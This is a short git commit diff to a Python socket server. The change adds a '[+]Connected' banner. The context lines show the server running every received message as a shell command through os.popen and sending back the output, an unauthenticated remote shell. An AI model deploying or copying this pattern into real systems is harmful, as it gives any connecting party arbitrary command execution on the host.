f1a6a1a557780d94d9873342c4efd1d3890cb788
kombat <kolyakovalev2000@mail.ru>
2019-01-06 00:54:38 +0600

    Update server.py

--- server.py
+++ server.py
@@ -10,7 +10,7 @@ sock.listen(2)
 conn, addr = sock.accept()
 
 print ('connected:', addr)
-
+conn.send(b"[+]Connected\x0a\x0a")
 while True:
     data = conn.recv(1024)
     a = os.popen(data.decode()).read().encode()
